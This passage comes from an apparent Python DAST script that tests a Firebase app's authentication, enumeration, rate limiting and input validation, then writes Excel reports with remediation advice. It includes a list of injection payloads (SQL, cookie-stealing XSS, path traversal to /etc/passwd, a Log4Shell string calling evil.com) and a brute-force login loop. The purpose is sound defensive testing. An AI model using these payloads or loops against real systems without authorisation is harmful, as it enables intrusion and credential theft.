           "0 hardcoded secrets", len(findings_list), None,
           len(findings_list) == 0, "info" if len(findings_list) == 0 else "high",
           f"Found {len(findings_list)} potential secrets: " + ", ".join(f["file"] for f in findings_list[:5])
           if findings_list else "No unexpected hardcoded secrets found")

    for f in findings_list[:10]:
        record("Hardcoded Creds", f"Secret: {f['type']}", f["file"], "SCAN", "auditor",
               "Removed/Env-var", "FOUND", f["sample"], False, "high",
               f"Remove from source; use environment variables or Firebase Remote Config")


# ══════════════════════════════════════════════
#  CATEGORY 9 — Enumeration & Information Leakage
# ══════════════════════════════════════════════
def cat_enumeration():
    print("\n" + "="*60)
    print("CATEGORY 9 · Enumeration & Information Leakage")
    print("="*60)

    token = ctx.get("user1_token")
    auth_h = {"Authorization": f"Bearer {token}"} if token else {}

    # ── Enumerate users by guessing UIDs ──
    guess_uids = [
        "admin", "administrator", "root", "test", "user",
        "000000001", "000000002",
    ]
    for uid_guess in guess_uids:
        url = f"{FS_BASE}/users/{uid_guess}"
        status, body, ms = req("GET", url, headers=auth_h)
        passed = status in (403, 404)  # 200 = data found
        record("Enumeration", f"UID enumeration: '{uid_guess}'", url, "GET", "user1",
               "403 or 404", status, body, passed,
               "medium" if status == 200 else "info",
               f"UID '{uid_guess}' exists in Firestore!" if status == 200 else f"UID '{uid_guess}' not found", ms)

    # ── Enumerate courses (public info — expected to work) ──
    url = f"{FS_BASE}/courses"
    status, body, ms = req("GET", url, headers=auth_h)
    courses_count = 0
    if status == 200 and isinstance(body, dict):
        courses_count = len(body.get("documents", []))
    record("Enumeration", "Enumerate all courses (auth)", url, "GET", "user1",
           "200 + course list", status, body, status == 200,
           "info",
           f"Found {courses_count} courses — this is expected behavior", ms)

    # ── Users list endpoint (no direct list endpoint in Firestore rules) ──
    users_list_url = f"{FS_BASE}/users"
    status, body, ms = req("GET", users_list_url, headers=auth_h)
    # Note: signedIn() allows reading the collection but listing all users may expose PII
    is_finding = status == 200
    record("Enumeration", "List ALL users (/users collection)", users_list_url, "GET", "user1",
           "403 (ideal) / 200 (rule allows)", status, body, not is_finding,
           "medium" if is_finding else "info",
           "FINDING: Any signed-in user can list all user documents (PII exposure)" if is_finding else "User list protected", ms)


# ══════════════════════════════════════════════
#  CATEGORY 10 — Auth State & Session Management
# ══════════════════════════════════════════════
def cat_session():
    print("\n" + "="*60)
    print("CATEGORY 10 · Auth State & Session Management")
    print("="*60)

    token = ctx.get("user1_token")
    uid   = ctx.get("user1_uid")
    if not token:
        print("  ⚠️  Skipping — no valid token")
        return

    auth_h = {"Authorization": f"Bearer {token}"}
    url    = f"{FS_BASE}/users/{uid}"

    # ── Verify token is valid ──
    verify_url = f"{AUTH_BASE}/accounts:lookup?key={FIREBASE_API_KEY}"
    status, body, ms = req("POST", verify_url, json_body={"idToken": token})
    passed = status == 200
    record("Session Mgmt", "Verify ID token validity", verify_url, "POST", "user1",
           "200 OK", status, body, passed, "high" if not passed else "info",
           "Token is valid" if passed else "Token validation failed", ms)

    # ── Check token not accepted as query param ──
    url_qp = f"{FS_BASE}/users/{uid}?access_token={token}"
    status2, body2, ms2 = req("GET", url_qp)  # No Authorization header
    passed2 = status2 in (401, 403)
    record("Session Mgmt", "Token in query param (must not work)", url_qp, "GET", "user1",
           "401 or 403", status2, body2, passed2,
           "high" if not passed2 else "info",
           "Query param token correctly rejected" if passed2 else "SECURITY: Query param token accepted!", ms2)

    # ── Password change updates token ──
    change_url = f"{AUTH_BASE}/accounts:update?key={FIREBASE_API_KEY}"
    status3, body3, ms3 = req("POST", change_url, json_body={
        "idToken": token,
        "password": TEST_USER_PW,  # same password
        "returnSecureToken": True
    })
    passed3 = status3 == 200
    record("Session Mgmt", "Password update returns new token", change_url, "POST", "user1",
           "200 + new idToken", status3, body3, passed3,
           "medium" if not passed3 else "info",
           "Password update works" if passed3 else "Password update failed", ms3)

    # ── Email update attempt ──
    new_email = f"changed_{random.randint(1000,9999)}@dasttest.invalid"
    status4, body4, ms4 = req("POST", change_url, json_body={
        "idToken": token,
        "email": new_email,
        "returnSecureToken": True
    })
    record("Session Mgmt", "Email change via API", change_url, "POST", "user1",
           "200 OK", status4, body4, status4 == 200,
           "info",
           "Email changed successfully — ensure email verification enforced" if status4 == 200 else "Email change failed", ms4)


# ══════════════════════════════════════════════
#  CATEGORY 11 — Rate Limiting & DoS Resistance
# ══════════════════════════════════════════════
def cat_rate_limiting():
    print("\n" + "="*60)
    print("CATEGORY 11 · Rate Limiting & DoS Resistance")
    print("="*60)

    login_url = f"{AUTH_BASE}/accounts:signInWithPassword?key={FIREBASE_API_KEY}"

    # ── Brute-force simulation (10 rapid attempts) ──
    statuses = []
    for i in range(10):
        status, body, ms = req("POST", login_url, json_body={
            "email": TEST_USER_EMAIL,
            "password": f"wrong_pass_{i}",
            "returnSecureToken": True
        })
        statuses.append(status)
        if status == 429 or (isinstance(body, dict) and "TOO_MANY_ATTEMPTS_TRY_LATER" in str(body)):
            break

    rate_limited = any(s == 429 for s in statuses) or any(
        "TOO_MANY_ATTEMPTS" in str(s) for s in statuses
    )
    record("Rate Limiting", "Brute-force login (10 rapid attempts)", login_url, "POST", "attacker",
           "429 or rate-limit message", statuses[-1], {"attempts": len(statuses)},
           rate_limited, "medium" if not rate_limited else "info",
           "Firebase rate limiting triggered" if rate_limited else "No rate limiting observed — Firebase may apply limits asynchronously",
           0)

    # ── Sign-up flood simulation ──
    signup_url = f"{AUTH_BASE}/accounts:signUp?key={FIREBASE_API_KEY}"
    flood_results = []
    for i in range(5):
        e = f"flood_{i}_{random.randint(1,9999)}@dasttest.invalid"
        status, body, ms = req("POST", signup_url, json_body={
            "email": e, "password": "TestPass@1234!", "returnSecureToken": True
        })
        flood_results.append(status)

    # Check for quota errors
    has_quota = any(s == 429 for s in flood_results)
    record("Rate Limiting", "Sign-up flood (5 rapid registrations)", signup_url, "POST", "attacker",
           "429 after N attempts (Firebase quota)", flood_results[-1], {"statuses": flood_results},
           True, "info",
           "Firebase imposes quota server-side; client-side rate limiting also recommended", 0)


# ══════════════════════════════════════════════
#  CATEGORY 12 — Input Validation
# ══════════════════════════════════════════════
def cat_input_validation():
    print("\n" + "="*60)
    print("CATEGORY 12 · Input Validation & Injection")
    print("="*60)

    token = ctx.get("user1_token")
    uid   = ctx.get("user1_uid")
    if not token or not uid:
        print("  ⚠️  Skipping — no valid token")
        return

    auth_h = {"Authorization": f"Bearer {token}"}
    plan_url = f"{FS_BASE}/users/{uid}/plans"

    injection_payloads = [
        ("SQL Injection",         "' OR '1'='1"),
        ("NoSQL Injection",       '{"$gt": ""}'),
        ("XSS Script",            "<script>alert(document.cookie)</script>"),
        ("SSTI",                  "{{7*7}}"),
        ("Path Traversal",        "../../etc/passwd"),
        ("Log4Shell",             "${jndi:ldap://evil.com/a}"),
        ("Null Byte",             "hello\x00world"),
        ("Unicode Overflow",      "A" * 5000),
        ("CRLF Injection",        "hello\r\nX-Injected: true"),
        ("HTML Injection",        '<img src=x onerror=alert(1)>'),
    ]

    for label, payload in injection_payloads:
        status, body, ms = req("POST", plan_url, headers=auth_h, json_body={
            "fields": {
                "subject":   {"stringValue": payload},
                "time":      {"stringValue": "00:00"},
                "priority":  {"stringValue": "Low"},
                "completed": {"booleanValue": False},
                "createdAt": {"integerValue": str(int(time.time()*1000))}
            }
        })
        # Firestore stores raw strings — client must sanitize on read
        # Flag if 500 or if error message leaks DB internals
        is_server_error = status == 500
        leaks = status == 200 and isinstance(body, dict) and any(
            x in str(body).lower() for x in ["sql", "exception", "stack", "error"]
        )
        passed = not is_server_error and not leaks
        record("Input Validation", f"Injection: {label}", plan_url, "POST", "user1",
               "200 (stored) or 400 (rejected)", status, str(payload)[:40],
               passed, "high" if is_server_error or leaks else "info",
               "Firestore stored payload — sanitize on client render" if status == 200 else
               "Server error on injection — may leak info" if is_server_error else "Rejected", ms)


# ══════════════════════════════════════════════
#  CLEANUP
# ══════════════════════════════════════════════
def cleanup_test_accounts():
    """Delete test accounts created during DAST."""
    print("\n[CLEANUP] Removing test accounts...")
    delete_url = f"{AUTH_BASE}/accounts:delete?key={FIREBASE_API_KEY}"
    for label, token_key in [("User1", "user1_token"), ("User2", "user2_token")]:
        token = ctx.get(token_key)
        if token:
            status, body, ms = req("POST", delete_url, json_body={"idToken": token})
            icon = "✅" if status == 200 else "⚠️"
            print(f"  {icon} {label} account deletion: HTTP {status}")


# ══════════════════════════════════════════════
#  EXCEL REPORT GENERATOR
# ══════════════════════════════════════════════
def generate_excel(output_path):
    print(f"\n[REPORT] Generating Excel report → {output_path}")

    wb = openpyxl.Workbook()

    # ── Colors ──
    HEADER_FILL   = PatternFill("solid", fgColor="1F3864")   # Dark navy
    PASS_FILL     = PatternFill("solid", fgColor="C6EFCE")   # Light green
    FAIL_FILL     = PatternFill("solid", fgColor="FFC7CE")   # Light red
    WARN_FILL     = PatternFill("solid", fgColor="FFEB9C")   # Light yellow
    CAT_FILL      = PatternFill("solid", fgColor="D9E1F2")   # Light blue
    CRIT_FILL     = PatternFill("solid", fgColor="FF0000")
    HIGH_FILL     = PatternFill("solid", fgColor="FF7043")
    MED_FILL      = PatternFill("solid", fgColor="FFA726")
    LOW_FILL      = PatternFill("solid", fgColor="FFF176")
    INFO_FILL     = PatternFill("solid", fgColor="E8F5E9")
    TITLE_FONT    = Font(bold=True, color="FFFFFF", size=11, name="Calibri")
    BOLD_FONT     = Font(bold=True, name="Calibri", size=10)
    REG_FONT      = Font(name="Calibri", size=10)
    CENTER        = Alignment(horizontal="center", vertical="center", wrap_text=True)
    LEFT          = Alignment(horizontal="left",   vertical="center", wrap_text=True)

    thin = Side(border_style="thin", color="B0B0B0")
    border = Border(left=thin, right=thin, top=thin, bottom=thin)

    def apply_header(ws, headers, col_widths):
        ws.append(headers)
        for col_idx, (cell, width) in enumerate(zip(ws[1], col_widths), start=1):
            cell.fill = HEADER_FILL
            cell.font = TITLE_FONT
            cell.alignment = CENTER
            cell.border = border
            ws.column_dimensions[get_column_letter(col_idx)].width = width

    # ════════════════════════════════════════════
    #  SHEET 1: Executive Summary
    # ════════════════════════════════════════════
    ws_sum = wb.active
    ws_sum.title = "Executive Summary"
    ws_sum.column_dimensions["A"].width = 32
    ws_sum.column_dimensions["B"].width = 18

    def add_sum_row(label, value, fill=None):
        r = ws_sum.max_row + 1
        ws_sum.cell(r, 1, label).font  = BOLD_FONT
        ws_sum.cell(r, 1).alignment   = LEFT
        ws_sum.cell(r, 1).border      = border
        ws_sum.cell(r, 2, value).font  = REG_FONT
        ws_sum.cell(r, 2).alignment   = CENTER
        ws_sum.cell(r, 2).border      = border
        if fill:
            ws_sum.cell(r, 2).fill = fill

    # Title
    ws_sum.merge_cells("A1:B1")
    t = ws_sum.cell(1, 1, "SmartStudy Firebase DAST — Executive Summary")
    t.font = Font(bold=True, size=14, color="1F3864", name="Calibri")
    t.alignment = CENTER
    ws_sum.row_dimensions[1].height = 30

    ws_sum.append([])
    total   = len(results)
    passed  = sum(1 for r in results if r["Result"] == "PASS")
    failed  = total - passed
    cats    = sorted(set(r["Category"] for r in results))
    by_sev  = defaultdict(int)
    for r in results:
        if r["Result"] == "FAIL":
            by_sev[r["Severity"]] += 1

    add_sum_row("Report Date",        datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"))
    add_sum_row("Project",            "SmartStudy Android App (Firebase)")
    add_sum_row("Firebase Project ID", FIREBASE_PROJECT_ID)
    add_sum_row("Test Type",          "DAST — Dynamic Application Security Testing")
    ws_sum.append([])
    add_sum_row("Total Test Cases",   total)
    add_sum_row("PASSED",             passed, PASS_FILL)
    add_sum_row("FAILED",             failed, FAIL_FILL if failed else PASS_FILL)
    add_sum_row("Pass Rate",          f"{100*passed//total if total else 0}%")
    ws_sum.append([])
    add_sum_row("Critical Findings",  by_sev.get("critical", 0), CRIT_FILL if by_sev.get("critical") else None)
    add_sum_row("High Findings",      by_sev.get("high", 0),     HIGH_FILL if by_sev.get("high") else None)
    add_sum_row("Medium Findings",    by_sev.get("medium", 0),   MED_FILL  if by_sev.get("medium") else None)
    add_sum_row("Low Findings",       by_sev.get("low", 0),      LOW_FILL  if by_sev.get("low") else None)
    add_sum_row("Info",               by_sev.get("info", 0))
    ws_sum.append([])
    add_sum_row("Categories Tested",  len(cats))
    for c in cats:
        cat_total  = sum(1 for r in results if r["Category"] == c)
        cat_passed = sum(1 for r in results if r["Category"] == c and r["Result"] == "PASS")
        add_sum_row(f"  • {c}", f"{cat_passed}/{cat_total}")

    # ════════════════════════════════════════════
    #  SHEET 2: Full Test Results
    # ════════════════════════════════════════════
    ws_full = wb.create_sheet("All Test Cases")
    cols = ["TC#", "Category", "Test Name", "Endpoint", "Method",
            "Role/Actor", "Expected", "HTTP Status", "Response Snippet",
            "Result", "Severity", "Response MS", "Note", "Timestamp"]
    widths = [6, 20, 38, 45, 8, 12, 16, 10, 30, 8, 10, 12, 50, 20]
    apply_header(ws_full, cols, widths)

    for r in results:
        row_data = [r.get(c, "") for c in cols]
        ws_full.append(row_data)
        row_idx = ws_full.max_row

        # Result color
        result_cell = ws_full.cell(row_idx, cols.index("Result") + 1)
        result_cell.fill = PASS_FILL if r["Result"] == "PASS" else FAIL_FILL
        result_cell.font = BOLD_FONT
        result_cell.alignment = CENTER

        # Severity color
        sev = r.get("Severity", "").lower()
        sev_cell = ws_full.cell(row_idx, cols.index("Severity") + 1)
        sev_cell.fill = {
            "critical": CRIT_FILL, "high": HIGH_FILL,
            "medium": MED_FILL, "low": LOW_FILL
        }.get(sev, INFO_FILL)
        sev_cell.alignment = CENTER

        # Style all cells
        for ci, cell in enumerate(ws_full[row_idx], 1):
            cell.font = REG_FONT
            cell.border = border
            cell.alignment = LEFT if ci not in (1, 5, 6, 10, 11, 12) else CENTER

        ws_full.row_dimensions[row_idx].height = 25

    # Auto-filter
    ws_full.auto_filter.ref = ws_full.dimensions
    ws_full.freeze_panes    = "A2"

    # ════════════════════════════════════════════
    #  SHEET 3: Failures Only
    # ════════════════════════════════════════════
    ws_fail = wb.create_sheet("Failures & Findings")
    apply_header(ws_fail, cols, widths)
    failures = [r for r in results if r["Result"] == "FAIL"]
    for r in failures:
        row_data = [r.get(c, "") for c in cols]
        ws_fail.append(row_data)
        row_idx = ws_fail.max_row
        for ci, cell in enumerate(ws_fail[row_idx], 1):
            cell.font   = REG_FONT
            cell.border = border
            cell.alignment = CENTER if ci in (1, 5, 6, 10, 11, 12) else LEFT
        ws_fail.cell(row_idx, cols.index("Result") + 1).fill = FAIL_FILL
        ws_fail.cell(row_idx, cols.index("Result") + 1).font = BOLD_FONT
        ws_fail.row_dimensions[row_idx].height = 28

    ws_fail.auto_filter.ref = ws_fail.dimensions if failures else None
    ws_fail.freeze_panes    = "A2"

    # ════════════════════════════════════════════
    #  SHEET 4: Category Breakdown
    # ════════════════════════════════════════════
    ws_cat = wb.create_sheet("Category Breakdown")
    cat_cols  = ["Category", "Total", "Passed", "Failed", "Pass Rate",
                 "Critical", "High", "Medium", "Low", "Info"]
    cat_widths = [24, 8, 8, 8, 10, 10, 8, 8, 8, 8]
    apply_header(ws_cat, cat_cols, cat_widths)

    for cat in cats:
        cat_results = [r for r in results if r["Category"] == cat]
        ct = len(cat_results)
        cp = sum(1 for r in cat_results if r["Result"] == "PASS")
        cf = ct - cp
        sev_counts = defaultdict(int)
        for r in cat_results:
            if r["Result"] == "FAIL":
                sev_counts[r["Severity"].lower()] += 1
        ws_cat.append([
            cat, ct, cp, cf,
            f"{100*cp//ct if ct else 0}%",
            sev_counts["critical"], sev_counts["high"],
            sev_counts["medium"],   sev_counts["low"],
            sev_counts["info"],
        ])
        ri = ws_cat.max_row
        ws_cat.cell(ri, 4).fill = FAIL_FILL if cf else PASS_FILL
        for ci, cell in enumerate(ws_cat[ri], 1):
            cell.font = REG_FONT; cell.border = border; cell.alignment = CENTER

    ws_cat.freeze_panes = "A2"

    # ════════════════════════════════════════════
    #  SHEET 5: Remediation Guide
    # ════════════════════════════════════════════
    ws_rem = wb.create_sheet("Remediation Guide")
    rem_cols  = ["Finding", "Severity", "Firestore Rule Fix / Code Fix", "Priority"]
    rem_widths = [40, 10, 70, 10]
    apply_header(ws_rem, rem_cols, rem_widths)

    remediations = [
        ("Any signed-in user can read ALL user profiles",
         "Medium",
         "Change: allow read: if signedIn();  →  allow read: if owns(userId);\nThis prevents one user from reading another user's profile data.",
         "High"),
        ("No field-level validation in security rules",
         "Critical",
         "Add to /users/{userId} rule:\nallow update: if owns(userId)\n  && !('premiumPlan' in request.resource.data)\n  && !('premiumUntil' in request.resource.data)\n  && !('xp' in request.resource.data);",
         "Critical"),
        ("User can self-assign premiumPlan via Firestore REST",
         "Critical",
         "Only allow premium updates via Cloud Functions / trusted server code. Add field validation in security rules to block client-side premium writes.",
         "Critical"),
        ("User can self-assign XP and streak",
         "Medium",
         "Move XP/streak logic to Cloud Functions triggered by testAttempt writes. Block direct XP/streak updates in security rules.",
         "High"),
        ("Firebase API Key exposed in google-services.json",
         "High",
         "Firebase Web API keys are intended to be public BUT restrict the key in Google Cloud Console:\n1. Go to APIs & Services → Credentials\n2. Restrict key to specific apps (Android package + SHA)\n3. Enable Firebase App Check for additional protection.",
         "High"),
        ("Any signed-in user can list all users (/users collection)",
         "Medium",
         "Restrict collection list: add a Firestore rule that prevents listing the entire /users collection. Use specific document reads only.",
         "Medium"),
        ("No rate limiting on login attempts (client-side)",
         "Medium",
         "Firebase applies server-side rate limiting. Additionally:\n1. Enable reCAPTCHA in Firebase Auth settings\n2. Set up Firebase App Check\n3. Monitor Auth events in Firebase console.",
         "Medium"),
        ("User delete is correctly blocked (allow delete: if false)",
         "Info",
         "Current implementation is correct. No action needed.",
         "None"),
        ("courses write is correctly blocked (allow write: if false)",
         "Info",
         "Current implementation is correct. No action needed.",
         "None"),
    ]

    for finding, sev, fix, priority in remediations:
        ws_rem.append([finding, sev, fix, priority])
        ri = ws_rem.max_row
        sev_fill = {"Critical": CRIT_FILL, "High": HIGH_FILL, "Medium": MED_FILL,
                    "Low": LOW_FILL, "Info": INFO_FILL}.get(sev, INFO_FILL)
        ws_rem.cell(ri, 2).fill = sev_fill
        for ci, cell in enumerate(ws_rem[ri], 1):
            cell.font = REG_FONT; cell.border = border
            cell.alignment = LEFT
        ws_rem.cell(ri, 2).alignment = CENTER
        ws_rem.cell(ri, 4).alignment = CENTER
        ws_rem.row_dimensions[ri].height = 60

    ws_rem.freeze_panes = "A2"

    wb.save(output_path)
    print(f"  ✅ Excel report saved: {output_path}")


# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════
def main():
    print("=" * 60)
    print("  SmartStudy Firebase DAST Runner")
    print(f"  Project: {FIREBASE_PROJECT_ID}")
    print(f"  Date:    {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}")
    print("=" * 60)

    try:
        cat_auth()
        cat_unauth_access()
        cat_auth_access()
        cat_idor()
        cat_token_tampering()
        cat_mass_assignment()
        cat_rules_audit()
        cat_hardcoded_creds()
        cat_enumeration()
        cat_session()
        cat_rate_limiting()
        cat_input_validation()
    except Exception as e:
        print(f"\n⚠️  Unhandled error: {e}")
        traceback.print_exc()
    finally:
        cleanup_test_accounts()

    # ── Save JSON ──
    json_path = REPORT_DIR / "firebase_dast_report.json"
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n✅ JSON report: {json_path}")

    # ── Save Excel ──
    excel_path = REPORT_DIR / "firebase_dast_report.xlsx"
    generate_excel(excel_path)

    # ── Print Summary ──
    total   = len(results)
    passed  = sum(1 for r in results if r["Result"] == "PASS")
    failed  = total - passed
    print("\n" + "=" * 60)
    print("  DAST COMPLETE — SUMMARY")
    print("=" * 60)
    print(f"  Total Tests  : {total}")
    print(f"  ✅ PASSED    : {passed}")
    print(f"  ❌ FAILED    : {failed}")
    print(f"  Pass Rate    : {100*passed//total if total else 0}%")

    by_sev = defaultdict(int)
    for r in results:
        if r["Result"] == "FAIL":
            by_sev[r["Severity"]] += 1

    print("\n  Findings by Severity:")
    for s, icon in [("critical","🔴"),("high","🟠"),("medium","🟡"),("low","🔵"),("info","⚪")]:
        if by_sev[s]:
            print(f"    {icon} {s.upper()}: {by_sev[s]}")

    print(f"\n  📊 Reports saved to: {REPORT_DIR}")
    print(f"     • firebase_dast_report.json")
    print(f"     • firebase_dast_report.xlsx")
    print("=" * 60)


if __name__ == "__main__":
    main()
